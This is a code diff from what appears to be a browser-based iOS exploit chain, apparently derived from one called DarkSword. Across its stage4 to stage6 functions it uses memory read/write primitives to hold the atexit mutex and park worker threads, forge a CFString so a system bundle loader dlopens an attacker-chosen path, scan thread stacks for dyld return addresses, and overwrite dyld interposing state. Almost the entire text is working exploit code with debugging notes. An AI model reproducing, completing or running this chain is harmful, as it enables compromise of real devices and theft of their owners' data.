@@ -24,8 +24,8 @@ function hex(value) {
 function noPAC(value) {
     return value & 0x7fffffffffn;
 }
-const W1_WAKE_PATH = '/System/Library/PrivateFrameworks/XOJIT.framework/XOJIT';               // worker1 wake: needs a vehicle whose initializers have static C++ destructors (what __cxa_atexit actually REGISTERS at runtime). Low-init frameworks DISPROVEN (2026-07-23): Proximity (1-2 inits) loaded 1100->1101 but GEN TIMEOUT every attempt -- ObjC/C-only inits, no runtime cxa registration, no drop. TextInput bundles are resource-only (no executable). XOJIT: ~71 real cxa registrations (produces drops), NOT resident at fire time, NOT in TT's closure. (MacinTalk disproven: RESIDENT via worker1's own TT load.) MUST NOT be XGBoost -- stage6's gate-free slow_dlopen needs that FRESH (a resident target -> no new inits -> no drop -> worker2 never wakes)
-const W2_WAKE_PATH = '/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI';               // worker2 wake: DarkSword's PROVEN wake framework (git 4e2aad1 WAKE_PATHS) -- DISTINCT family from XGBoost, never resident -> loads fresh and its C++ initializers' __cxa_atexit produce the drop. MacinTalk REPLACED (2026-08-02): 3 inits loaded fresh (1107->1109) but produced NO cxa registration -> GEN TIMEOUT every run (the documented low-init failure: ObjC/C-only inits, no runtime cxa registration, no drop)
+const W1_WAKE_PATH = '/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI';               // worker1 wake: HomeUI = DarkSword's PROVEN wake framework, never resident, loads fresh C++ initializers with __cxa_atexit. (XOJIT moved to park target for A14 fix -- libARI resident on A14.)
+const W2_WAKE_PATH = '/System/Library/PrivateFrameworks/SoundAnalysis.framework/SoundAnalysis'; // worker2 wake: SoundAnalysis = heavy C++ ML framework, not resident, should produce cxa registrations. (HomeUI moved to W1_WAKE for A14 fix.)
 async function fireWorkerWake(path, tok, opts) {
     postMessage(`[mapredir] worker wake: ${path}`);
     return await wakeViaMapRedirect(path, tok, opts);
@@ -1790,10 +1790,12 @@ async function stage4() {
         postMessage(`dispatchBlock: ${hex(dispatchBlock)}`);
         p.write64(dispatchBlock + structs.DispatchBlock_invoke, paciza_nullfunc);
     }
-    // worker1's park class: AVFAudio AVSpeechSynthesisProviderAudioUnit (fast AVFAudio loader that
-    // COMPLETES its +initialize, unlike the TextToSpeech TTSMagic class which parks in Bambi
-    // session-analytics and lags the once-gate completion -> the recurring dispatch-gate brk).
-    // Using the wake-pool's spare class so Synthesizer/ProviderVoice stay fresh for the wake fires.
+    // A14 FIX v5: the original code pre-loaded TextToSpeech via loadObjcClass(ProviderRequest),
+    // which on A14 initialized ALL AVSpeech* classes as a side effect -> bitmap.close() couldn't
+    // re-trigger +initialize. Fix: skip the pre-load entirely. The WORKER's own bitmap.close()
+    // triggers the FIRST-EVER ProviderAudioUnit +initialize -> AVLoadSpeechSynthesisImplementation
+    // -> dispatch_once -> dlopen(TextToSpeech) -> __cxa_atexit -> blocks on held atexit mutex.
+    // NSBundle capture moves to stage5 (after the worker parks, TextToSpeech IS loaded).
     const classes = [offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
     for (let i = 0; i < 2; ++i) {
         const worker = p.dlopen_workers[i];
@@ -1803,55 +1805,13 @@ async function stage4() {
         postMessage(`imageBuffer: ${hex(imageBuffer)}`);
         p.write64(imageBuffer + structs.ImageBuffer_objcClass, classes[i]);
     }
-    postMessage('Load TextToSpeech');
-    await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
-    postMessage('TextToSpeech Loaded');
-    const NSBundleTables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
-    postMessage(`NSBundleTables: ${hex(NSBundleTables)}`);
-    const loadedFrameworks = p.read64(NSBundleTables + structs.NSBundleTables_loadedFrameworks);
-    postMessage(`loadedFrameworks: ${hex(loadedFrameworks)}`);
-    const loadedFrameworks_length = p.read64(loadedFrameworks + structs.LoadedFrameworks_count);
-    postMessage(`loadedFrameworks_length: ${hex(loadedFrameworks_length)}`);
-    const loadedFrameworks_buffer = p.read64(loadedFrameworks + structs.LoadedFrameworks_buffer);
-    postMessage(`loadedFrameworks_buffer: ${hex(loadedFrameworks_buffer)}`);
-    let TextToSpeech_NSBundle;
-    for (let i = 0n; i < loadedFrameworks_length; ++i) {
-        const bundle = p.read64(loadedFrameworks_buffer + 8n * i);
-        if (bundle <= 0x1_00000000n) continue;
-        postMessage(`bundle[${i}]: ${hex(bundle)}`);
-        const initialPath = p.read64(bundle + structs.NSBundle_initialPath);
-        if (initialPath != offsets.AVFAudio__cfstr_SystemLibraryTextToSpeech) continue;
-        TextToSpeech_NSBundle = bundle;
-        break;
-    }
-    postMessage(`TextToSpeech_NSBundle: ${hex(TextToSpeech_NSBundle)}`);
-    const TextToSpeech_CFBundle = p.read64(TextToSpeech_NSBundle + structs.NSBundle_cfBundle);
-    postMessage(`TextToSpeech_CFBundle: ${hex(TextToSpeech_CFBundle)}`);
-    p.TextToSpeech_NSBundle = TextToSpeech_NSBundle;
-    p.TextToSpeech_CFBundle = TextToSpeech_CFBundle;
-
-    // Re-arm the TextToSpeech CFBundle's loader: mark it unloaded (NSBundle/CFBundle flags),
-    // reset AVLoadSpeechSynthesisImplementation's dispatch_once, and repoint the bundle's
-    // executable path at a forged CFString {cstringOffset, cstringSize}. The NEXT realization of
-    // an AVFAudio class then dlopens that path instead of the real speech engine.
-    // Write a NUL-terminated ASCII C string into a fresh, GC-pinned buffer and return its
-    // NUL-terminated ASCII C string via DarkSword's rope-flattening trick: `str + '\0'` builds a
-    // JSRopeString, `delete rope_resolver[str]` forces ToPropertyKey -> flattens it into a
-    // contiguous 8-bit StringImpl, then JSString+8 -> StringImpl*, StringImpl+8 -> the char data.
-    // This is DarkSword's proven robust path (no Uint8Array backing-store games, no addrof+0x10
-    // fragility). Lets us hand CoreFoundation/dyld an attacker-controlled C string.
-    // C-STRINGS WITHOUT ROPES (2026-07-22, the error-return root): the old rope-flatten trick
-    // (str+'\0' + delete -> contiguous StringImpl, JSString+8 -> StringImpl+8 -> data) only works
-    // for POINTER-BACKED StringImpls. On 26.1's JSC, SHORT strings (libARI's 21-char path!) are
-    // INLINE StringImpls: StringImpl+8 is the chars THEMSELVES, so the old code read the first 8
-    // characters ('/usr/lib') as a "pointer" -> garbage exec path -> libARI load fails ->
-    // worker1's block early-returns -> its dispatch_once completion brks on a walked token (the
-    // recurring vphone gate brks; the "etsy" SIGSEGV is the same deref on a longer inline string).
-    // This version writes the bytes into a fresh GC-pinned BigUint64Array with write64 --
-    // deterministic for every length, no StringImpl-layout dependence.
+    // A14 v5: NO TextToSpeech pre-load. The worker's own bitmap.close() triggers the FIRST
+    // ProviderAudioUnit +initialize -> AVLoadSpeechSynthesisImplementation -> dispatch_once ->
+    // dlopen(TextToSpeech) -> __cxa_atexit -> blocks on held atexit mutex -> PARKS.
+    // NSBundle capture + rearmCFBundleLoader move to stage5 (after worker parks).
     p.cstrBufs = p.cstrBufs || [];
     p.makeCString = (str) => {
-        const buf = new BigUint64Array(0x40);   // 512 bytes, GC-pinned below
+        const buf = new BigUint64Array(0x40);
         p.cstrBufs.push(buf);
         const data = buf.data();
         const full = str + '\0';
@@ -1862,6 +1822,47 @@ async function stage4() {
         }
         return { ptr: data, len: BigInt(str.length) };
     };
+    atexitHold();
+    postMessage(`[stage4] A14 v5: skipped TTS pre-load; atexitHold done; onceToken=${hex(p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken))} (should be 0=virgin) loadedCount=${dyldLoadedCount()}`);
+}
+
+
+async function stage5() {
+    const { offsets } = p;
+    // === A14 DIAGNOSTIC: did the bitmap.close() -> TextToSpeech loader -> dlopen chain fire? ===
+    const __onceToken = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
+    const __atexitState = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
+    const __cfstrPtr = p.read64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr);
+    const __cfstrLen = p.read64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length);
+    postMessage(`[stage5] DIAG: onceToken=${hex(__onceToken)} (0=never fired, -1=fired) atexitMutex=${hex(__atexitState)} (0x102=untouched) cfstrPtr=${hex(__cfstrPtr)} cfstrLen=${__cfstrLen}`);
+    // === end diagnostic ===
+
+    // A14 v5: TextToSpeech was loaded by worker1's bitmap.close() (ProviderAudioUnit +initialize
+    // -> AVLoadSpeechSynthesisImplementation -> dispatch_once -> dlopen). Capture the NSBundle now.
+    const NSBundleTables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
+    postMessage(`[stage5] NSBundleTables: ${hex(NSBundleTables)}`);
+    const loadedFrameworks = p.read64(NSBundleTables + structs.NSBundleTables_loadedFrameworks);
+    const loadedFrameworks_length = p.read64(loadedFrameworks + structs.LoadedFrameworks_count);
+    const loadedFrameworks_buffer = p.read64(loadedFrameworks + structs.LoadedFrameworks_buffer);
+    postMessage(`[stage5] loadedFrameworks: count=${loadedFrameworks_length}`);
+    let TextToSpeech_NSBundle;
+    for (let i = 0n; i < loadedFrameworks_length; ++i) {
+        const bundle = p.read64(loadedFrameworks_buffer + 8n * i);
+        if (bundle <= 0x1_00000000n) continue;
+        const initialPath = p.read64(bundle + structs.NSBundle_initialPath);
+        if (initialPath != offsets.AVFAudio__cfstr_SystemLibraryTextToSpeech) continue;
+        TextToSpeech_NSBundle = bundle;
+        break;
+    }
+    if (!TextToSpeech_NSBundle) {
+        postMessage(`[stage5] ABORT: TextToSpeech NSBundle not found (worker didn't load TTS?)`);
+        return;
+    }
+    postMessage(`[stage5] TextToSpeech_NSBundle: ${hex(TextToSpeech_NSBundle)}`);
+    const TextToSpeech_CFBundle = p.read64(TextToSpeech_NSBundle + structs.NSBundle_cfBundle);
+    postMessage(`[stage5] TextToSpeech_CFBundle: ${hex(TextToSpeech_CFBundle)}`);
+    p.TextToSpeech_NSBundle = TextToSpeech_NSBundle;
+    p.TextToSpeech_CFBundle = TextToSpeech_CFBundle;
 
     p.rearmCFBundleLoader = (cstringOffset, cstringSize) => {
         p.write64(TextToSpeech_NSBundle + structs.NSBundle_flags, 0x40008n);
@@ -1870,23 +1871,10 @@ async function stage4() {
         p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, cstringOffset);
         p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cstringSize);
         p.write64(TextToSpeech_CFBundle + structs.CFBundle_execPath, offsets.CFNetwork__gConstantCFStringValueTable);
-        atexitHold();   // park the next worker's __cxa_atexit with a registered waiter (was bare 0x03, which erased the waiter registration)
-    }
+        atexitHold();
+    };
 
-    // worker1 park target = libARI (DarkSword's original). Confirmed present + parks on vphone 2026-07-11
-    // (imports ___cxa_atexit; deps = CoreFoundation/libc++/libSystem, all already loaded -> no +load crash).
-    const targetDylib = "/usr/lib/libARI.dylib";
-    const dylibPath = p.makeCString(targetDylib);
-    postMessage(`[stage4] dlopen target '${targetDylib}' buffer @ ${hex(dylibPath.ptr)} len=${dylibPath.len}`);
-    p.rearmCFBundleLoader(dylibPath.ptr, dylibPath.len);
-}
-
-
-async function stage5() {
     postMessage(`[stage5] overwriting p_InterposeTupleAll_buffer`);
-    const {
-        offsets
-    } = p;
 
     const worker = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === 0x11111111n);
     postMessage(`[stage5] worker.thread: ${hex(worker.thread)}`);
@@ -1921,13 +1909,28 @@ async function stage5() {
     p.efficient_search = function (begin, end, bytes) {
         const needle = String.fromCharCode(...bytes);
         const finder = p.create_jsstring(begin, end - begin);
-        while (true) {
+        for (let attempt = 0; attempt < 100; attempt++) {
             const index = finder.indexOf(needle);
             if (index != -1) {
                 postMessage(`[stage5] index:${index}`);
                 return begin + BigInt(index);
             }
         }
+        postMessage(`[stage5] NEEDLE NOT FOUND on stack [${hex(begin)}-${hex(end)}] after 100 attempts`);
+        postMessage(`[stage5] needle bytes: [${bytes.map(b => '0x'+b.toString(16)).join(', ')}]`);
+        // Dump stack frames looking for dyld return addresses (0x180..0x1a0 range unslid)
+        const slide = p.slide;
+        for (let off = 0n; off < (end - begin); off += 8n) {
+            const v = p.read64(begin + off);
+            const stripped = v & 0x7fffffffffn;
+            // Check if it looks like a dyld address (0x180100000-0x180200000 unslid range)
+            const unslid = stripped - slide;
+            if (unslid >= 0x180100000n && unslid <= 0x180200000n) {
+                postMessage(`[stage5] stack+${hex(off)}: ${hex(v)} -> unslid ${hex(unslid)} (dyld)`);
+            }
+        }
+        postMessage(`[stage5] stack scan done — returning 0`);
+        return 0n;
     };
     // single-shot variant (no infinite retry) for the park-gate poll
     p.search_once = function (begin, end, bytes) {
@@ -1964,9 +1967,13 @@ async function stage5() {
     postMessage(`[stage5] p.dlopen_from_lambda_ret: ${hex(p.dlopen_from_lambda_ret)}`);
     u64[0] = p.dlopen_from_lambda_ret;
     const needle = [u8[0], u8[1], u8[2], u8[3]];
-    postMessage(`[stage5] searching for dlopen_from_lambda_ret in worker thread's stack [${hex(stack_top)}-${hex(stack_bottom)}]...`);
+    postMessage(`[stage5] needle: [${needle.map(b => '0x'+b.toString(16)).join(', ')}] searching stack [${hex(stack_top)}-${hex(stack_bottom)}] (${Number(stack_bottom-stack_top)} bytes)...`);
     const search_result = p.efficient_search(stack_top, stack_bottom, needle);
     postMessage(`[stage5] search_result:${hex(search_result)}`);
+    if (search_result === 0n) {
+        postMessage(`[stage5] ABORT: dlopen_from_lambda_ret not found on worker1 stack`);
+        return;
+    }
     const loader = search_result + structs.StackFrame_loader;
     postMessage(`[stage5] loader:${hex(loader)}`);
     // 0x140 entries, not 0x100: run 014753 baseline showed PRE-EXISTING interposing state
@@ -2128,6 +2135,10 @@ async function stage6() {
     const needle = [u8[0], u8[1], u8[2], u8[3]];
     const search_result = p.efficient_search(stack_top, stack_bottom, needle);
     postMessage(`search_result:${hex(search_result)}`);
+    if (search_result === 0n) {
+        postMessage(`[stage6] ABORT: dlopen_from_lambda_ret not found on worker2 stack`);
+        return;
+    }
     const loader = search_result + 0x78n;
     postMessage(`loader:${hex(loader)}`);
     const metadata = new BigUint64Array(4);
